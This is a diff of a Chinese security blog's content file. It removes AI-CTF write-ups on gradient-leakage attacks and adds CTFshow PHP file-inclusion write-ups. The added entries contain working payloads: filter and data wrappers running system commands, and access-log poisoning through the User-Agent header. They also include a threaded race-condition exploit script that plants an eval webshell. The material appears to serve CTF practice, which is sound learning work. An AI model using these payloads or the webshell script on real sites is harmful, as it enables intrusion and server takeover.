class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br><span class="line">    plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">        plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">        plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">        plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">        plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">    plt.show()</span><br></pre></td></tr></table></figure>
-<p>根据出题人给出的exp，尝试运行，但实际恢复效果却不太好？</p>
-<p>这边对每一部分代码进行解释</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">AliceNet2</span>(nn.Module):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">super</span>(AliceNet2, self).__init__()</span><br><span class="line">        self.conv = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Conv2d(<span class="number">3</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>, stride=<span class="number">2</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">            nn.Conv2d(<span class="number">12</span>,<span class="number">12</span>,kernel_size=<span class="number">5</span>,padding=<span class="number">2</span>,stride=<span class="number">1</span>),</span><br><span class="line">            nn.Sigmoid(),</span><br><span class="line">        )</span><br><span class="line">        self.fc = \</span><br><span class="line">            nn.Sequential(</span><br><span class="line">            nn.Linear(<span class="number">768</span>, <span class="number">200</span>)</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">forward</span>(<span class="params">self, x</span>):</span><br><span class="line">        x = self.conv(x)</span><br><span class="line">        x = x.view(x.size(<span class="number">0</span>), -<span class="number">1</span>)</span><br><span class="line">        x = self.fc(x)</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">criterion</span>(<span class="params">pred_y, grand_y</span>):</span><br><span class="line">    <span class="comment"># This is the Cross entropy loss function</span></span><br><span class="line">    tmptensor=torch.mean(</span><br><span class="line">        torch.<span class="built_in">sum</span>(</span><br><span class="line">            - grand_y * F.log_softmax(pred_y, dim=-<span class="number">1</span>), <span class="number">1</span></span><br><span class="line">        ))</span><br><span class="line">    <span class="keyword">return</span> tmptensor</span><br></pre></td></tr></table></figure>
-<p>这里初识化定义了一个卷积神经网络模型LeNet，在原论文中除了LeNet网络模型，还有一种为Resnet，暂时先对这一种进行理解。序列里包含了四个卷积层，每个卷积层后面跟着一个 Sigmoid 激活函数。每个卷积层使用 5x5 的卷积核，具有不同的步长 (<code>stride</code>) 和池化(<code>padding</code>)。</p>
-<p>然后包含一个线性全连接层，输入特征数为 768（由前面的卷积层产生）和输出特征数为 200。通过这个全连接层，网络将图像的特征映射到一个 200 维的空间，通常用于图像分类及特征提取。</p>
-<p>其中forward方法定义了数据在通过模型时的前向传播过程，输入数据 <code>x</code> 经过卷积层处理，然后被拉直成一维向量，最后经过全连接层 得到最终输出。</p>
-<p>criterion 函数定义了交叉熵损失函数，用于衡量模型输出与目标标签之间的差异。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ts1 = transforms.Compose([transforms.Resize(<span class="number">32</span>),transforms.CenterCrop(<span class="number">32</span>),transforms.ToTensor()])</span><br><span class="line">ts2 = transforms.ToPILImage()</span><br></pre></td></tr></table></figure>
-<p>这里的两行主要是进行图像转换的一些操作，第一行用于图像转换为张量，第二行用于张量转换为图像，即图像的预处理和后处理。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_device = <span class="string">&quot;cpu&quot;</span></span><br><span class="line"><span class="keyword">if</span> torch.cuda.is_available():</span><br><span class="line">    my_device = <span class="string">&quot;cuda&quot;</span></span><br><span class="line"></span><br><span class="line">Net = torch.load(<span class="string">&#x27;./Net.model&#x27;</span>).to(my_device)</span><br><span class="line">outpath=<span class="string">&#x27;./grad/&#x27;</span></span><br></pre></td></tr></table></figure>
-<p>使用计算机cuda进行计算，以及对模型和张量数据的导入处理</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-<p><code>torch.manual_seed(0)</code> 的作用是设置 PyTorch 中的随机数生成器的种子为 0，相同的随机数种子将产生相同的随机数序列。而在这种攻击方法中，有涉及到伪标签和伪数据的初始化，所以设置seed种子，尽可能保证生成的相似性。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    original_dy_dx=dy_dx=torch.load(outpath+<span class="built_in">str</span>(i)+<span class="string">&#x27;.tensor&#x27;</span>)</span><br><span class="line">    dummy_data = torch.randn(<span class="number">1</span>,<span class="number">3</span>,<span class="number">32</span>,<span class="number">32</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    dummy_label = torch.randn(<span class="number">1</span>,<span class="number">200</span>).to(my_device).requires_grad_(<span class="literal">True</span>)</span><br><span class="line">    optimizer = torch.optim.LBFGS([dummy_data, dummy_label])</span><br><span class="line">    history = []</span><br><span class="line">    <span class="keyword">for</span> iters <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">300</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">closure</span>():</span><br><span class="line">            optimizer.zero_grad()</span><br><span class="line">            pred = Net(dummy_data)</span><br><span class="line">            dummy_onehot_label = F.softmax(dummy_label, dim=-<span class="number">1</span>)</span><br><span class="line">            dummy_loss = criterion(pred,</span><br><span class="line">                                   dummy_onehot_label)</span><br><span class="line">            dummy_dy_dx = torch.autograd.grad(dummy_loss, Net.parameters(), create_graph=<span class="literal">True</span>)</span><br><span class="line">            grad_diff = <span class="number">0</span></span><br><span class="line">            grad_count = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> gx, gy <span class="keyword">in</span> <span class="built_in">zip</span>(dummy_dy_dx, original_dy_dx):</span><br><span class="line">                grad_diff += ((gx - gy) ** <span class="number">2</span>).<span class="built_in">sum</span>()</span><br><span class="line">                grad_count += gx.nelement()</span><br><span class="line">            grad_diff.backward()</span><br><span class="line">            <span class="keyword">return</span> grad_diff</span><br><span class="line"></span><br><span class="line">        optimizer.step(closure)</span><br><span class="line">        <span class="keyword">if</span> iters % <span class="number">10</span> == <span class="number">0</span>:</span><br><span class="line">            current_loss = closure()</span><br><span class="line">            <span class="built_in">print</span>(iters, <span class="string">&quot;%.4f&quot;</span> % current_loss.item())</span><br><span class="line">        history.append(ts2(dummy_data[<span class="number">0</span>].cpu()))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>这一段是论文思想的核心重点就是创建dummy_data,dummy_label所得到的梯度与原始训练数据所得到的梯度的均方误差，再用损失函数对dummy_data,dummy_label最优化，不断迭代以恢复出原始数据，但是可能也就是这里存在问题，使得我实际得到的图像效果不佳，但暂时还没确定问题的原因。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">12</span>, <span class="number">8</span>))</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">       plt.subplot(<span class="number">3</span>, <span class="number">10</span>, i + <span class="number">1</span>)</span><br><span class="line">       plt.imshow(history[i * <span class="number">10</span>])</span><br><span class="line">       plt.title(<span class="string">&quot;iter=%d&quot;</span> % (i * <span class="number">10</span>))</span><br><span class="line">       plt.axis(<span class="string">&#x27;off&#x27;</span>)</span><br><span class="line">   <span class="built_in">print</span>(<span class="string">&quot;Dummy label is %d.&quot;</span> % torch.argmax(dummy_label, dim=-<span class="number">1</span>).item())</span><br><span class="line">   plt.show()</span><br></pre></td></tr></table></figure>
-<p>这一段就是将所优化后的数据进行可视化操作，以达成数据恢复的目的</p>
-<p>然后根据相关资料找了一个改进的攻击方法</p>
-]]></content>
-      <categories>
-        <category>AI</category>
-        <category>AI-CTF</category>
-      </categories>
-      <tags>
-        <tag>AI</tag>
-        <tag>2022*CTF</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>AI-CTF（3）network-in-network</title>
-    <url>/2023/12/01/AI-CTF%EF%BC%883%EF%BC%89network-in-network/</url>
-    <content><![CDATA[<h1>AI-CTF（3）network-in-network</h1>
-<p>本题来自2023HITCTF，这是赛后进行的复现</p>
-<p>有被骂到，qwq~~</p>
-<p><img src="https://s2.loli.net/2023/12/01/bB4Tfy8JHpP2Nd9.png" alt=""></p>
-<p>首先来看问题代码</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> torch</span><br><span class="line"><span class="keyword">import</span> torch.nn <span class="keyword">as</span> nn</span><br><span class="line"><span class="keyword">import</span> torchvision.transforms <span class="keyword">as</span> transforms</span><br><span class="line"><span class="keyword">import</span> torchvision</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br><span class="line">m = trans(file)</span><br><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>简单解释</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file = Image.<span class="built_in">open</span>(<span class="string">&#x27;origin.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>使用 PIL 打开一张名为 ‘origin.jpg’ 的图像。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">trans = transforms.Compose([</span><br><span class="line">    transforms.ToTensor(),</span><br><span class="line">])</span><br></pre></td></tr></table></figure>
-<p>创建一个图像转换操作的管道，将图像转换为 PyTorch 的张量（tensor）。<code>transforms.ToTensor()</code> 将图像转换为张量。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = trans(file)</span><br></pre></td></tr></table></figure>
-<p>通过上面的转换管道，将图像 ‘origin.jpg’ 转换为张量 <code>m</code>。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.manual_seed(<span class="number">0x2daa1a1</span>)</span><br></pre></td></tr></table></figure>
-<p>设置 PyTorch 的随机种子，以确保结果的可重复性。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">net = nn.Sequential(</span><br><span class="line">    nn.Conv2d(<span class="number">3</span>, <span class="number">5</span>, <span class="number">3</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.Conv2d(<span class="number">5</span>, <span class="number">10</span>, <span class="number">5</span>),</span><br><span class="line">    nn.ReLU(),</span><br><span class="line">    nn.MaxPool2d(<span class="number">2</span>),</span><br><span class="line">    nn.Linear(<span class="number">317</span>, <span class="number">800</span>),</span><br><span class="line">    nn.Conv2d(<span class="number">10</span>, <span class="number">1</span>, <span class="number">1</span>),</span><br><span class="line">    nn.Sigmoid()</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<p>构建一个简单的卷积神经网络（CNN）模型。该模型由以下层组成：</p>
-<ul>
-<li>一个卷积层 (<code>nn.Conv2d</code>)，输入通道数为 3，输出通道数为 5，卷积核大小为 3。</li>
-<li>一个 ReLU 激活函数 (<code>nn.ReLU</code>)。</li>
-<li>一个卷积层，输入通道数为 5，输出通道数为 10，卷积核大小为 5。</li>
-<li>一个 ReLU 激活函数。</li>
-<li>一个最大池化层 (<code>nn.MaxPool2d</code>)，池化窗口大小为 2。</li>
-<li>一个全连接层 (<code>nn.Linear</code>)，输入特征数为 317，输出特征数为 800。</li>
-<li>一个卷积层，输入通道数为 10，输出通道数为 1，卷积核大小为 1。</li>
-<li>一个 Sigmoid 激活函数 (<code>nn.Sigmoid</code>)。</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torchvision.utils.save_image(net(m).squeeze(), <span class="string">&#x27;enc.png&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>使用模型对输入图像进行处理，将处理后的张量通过 <code>squeeze()</code> 去掉维度为 1 的尺寸，然后使用 <code>torchvision.utils.save_image</code> 将处理后的图像保存为 ‘enc.png’。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">torch.save(net, <span class="string">&#x27;net.pt&#x27;</span>)</span><br></pre></td></tr></table></figure>
-<p>其实，这题的重点问题模型的输出逆推。首先，是前面卷积层卷积核小，仅捕捉局部细节特征，对整体图像不会有太大影响。其次，在全连接层，将十个通道进行了归一化处理，因此我们所能得到的仅是全连接层后被均值处理后的图像。</p>
-<p>被困难卡住了，得弄明白回来补充</p>
-]]></content>
-      <categories>
-        <category>AI</category>
-        <category>AI-CTF</category>
-      </categories>
-      <tags>
-        <tag>HITCTF</tag>
-        <tag>AI</tag>
       </tags>
   </entry>
   <entry>
@@ -1087,6 +1087,96 @@
       </categories>
       <tags>
         <tag>信息搜集</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTFshow-文件包含</title>
+    <url>/2024/01/19/CTFshow-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
+    <content><![CDATA[<h1>CTFshow-文件包含</h1>
+<h2 id="web78">web78</h2>
+<h3 id="源码">源码</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="payload">payload</h3>
+<p>文件包含，伪协议的利用，可以使用的方法有很多</p>
+<h4 id="方法一">方法一</h4>
+<p>php协议</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h4 id="方法二">方法二</h4>
+<p>data协议+命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php system(&#x27;ls&#x27;);?&gt; </span><br><span class="line">?file=data://text/plain,&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="web79">web79</h2>
+<h3 id="源码-2">源码</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="payload-2">payload</h3>
+<p>过滤了php，可以考虑的办法就是对php绕过或者是改用其他协议</p>
+<p>这边选择直接使用data协议+命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?=system(&quot;tac%20flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+<p>注意跟上题不同的一点，因为过滤了php，所以在php代码执行环境的方法需要变一下</p>
+<h2 id="web80">web80</h2>
+<h3 id="源码-3">源码</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="payload-3">payload</h3>
+<p>这里将data协议也过滤了</p>
+<p>这里学到一个新方法，利用文件日志包含进行getshell的操作</p>
+<p>首先在User-Agent中写入我们需要执行的命令，然后相关请求就会存放于日志文件中，然后对该日志文件进行文件包含操作，就可以成功getshell了，当然直接写入一句话木马也是可以的。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<h2 id="web81">web81</h2>
+<h3 id="源码-4">源码</h3>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;file&#x27;]))&#123;</span><br><span class="line">    $file = $_GET[&#x27;file&#x27;];</span><br><span class="line">    $file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;data&quot;, &quot;???&quot;, $file);</span><br><span class="line">    $file = str_replace(&quot;:&quot;, &quot;???&quot;, $file);</span><br><span class="line">    include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="payload-4">payload</h3>
+<p>本题仅禁用了:，对于上一题的日志写入没有过滤，仍然可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">User-Agent:&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br><span class="line">User-Agent:&lt;?php system(&#x27;cat fl0g.php&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+<h2 id="web82">web82</h2>
+<h2 id="web83">web83</h2>
+<h2 id="web84">web84</h2>
+<h2 id="web85">web85</h2>
+<h2 id="web86">web86</h2>
+<p>以上这些全部归属于条件竞争</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="comment"># 填入对应网址</span></span><br><span class="line">url=<span class="string">&#x27;h&#x27;</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">data=&#123;</span><br><span class="line">	<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/muma.php&#x27;,&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;);&quot;</span></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">post 传递内容可在网站目录下写入一句话木马。</span></span><br><span class="line"><span class="string">根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。</span></span><br><span class="line"><span class="string">sessionid 可控，所以这里即 /tmp/sess_ctfshow。</span></span><br><span class="line"><span class="string">这样一旦访问成功，就说明木马植入了</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># /tmp/sess_sessionid 中写入一句话木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):  </span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url,</span><br><span class="line">			data=&#123;</span><br><span class="line">			<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span></span><br><span class="line">			&#125;,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;,</span><br><span class="line">			files=&#123;</span><br><span class="line">			<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(</span><br><span class="line">			url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,</span><br><span class="line">	        data=data,</span><br><span class="line">			cookies=&#123;</span><br><span class="line">			<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid</span><br><span class="line">			&#125;</span><br><span class="line">			)</span><br><span class="line">		<span class="comment"># 访问木马文件，如果访问到了就代表竞争成功</span></span><br><span class="line">		resposne2=session.get(url+<span class="string">&#x27;muma.php&#x27;</span>)</span><br><span class="line">		<span class="keyword">if</span> resposne2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++done++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(resposne2.status_code)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="comment"># 写入和访问分别设置 5 个线程。</span></span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
+<p>这是一个现有的exp，具体原理需要研究一下</p>
+<h2 id="web87">web87</h2>
+<h3 id="源码-5">源码</h3>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;php&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;data&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;???&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>), <span class="string">&quot;&lt;?php die(&#x27;大佬别秀了&#x27;);?&gt;&quot;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="payload-5">payload</h3>
+<p>这边先来看一下<code>file_put_contents</code> 是一个 PHP 函数，用于将一个字符串写入文件。它提供了一种简单的方法，可以直接将字符串内容写入文件中，而无需使用多个函数来打开、写入和关闭文件。</p>
+<p>基本的语法如下：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">file_put_contents</span>(filename, data, mode, context);</span><br></pre></td></tr></table></figure>
+<p>其中：</p>
+<ul>
+<li><code>filename</code> 是要写入的目标文件的文件名，可以包含路径信息。</li>
+<li><code>data</code> 是要写入文件的字符串数据。</li>
+<li><code>mode</code> 是一个可选参数，表示文件写入的模式。默认是 <code>0</code>，表示没有特殊处理。你可以使用 <code>FILE_APPEND</code> 来在文件末尾追加内容，如果文件不存在，则会创建新文件。</li>
+<li><code>context</code> 是一个可选参数，表示上下文资源，通常在需要自定义流上下文的情况下使用。</li>
+</ul>
+<p><strong>get参数</strong></p>
+<p>get请求的参数file会经过urldecode参数的处理，所以在传入的时候需要经过二次编码</p>
+<p><strong>原始</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
+<p><strong>二次编码</strong></p>
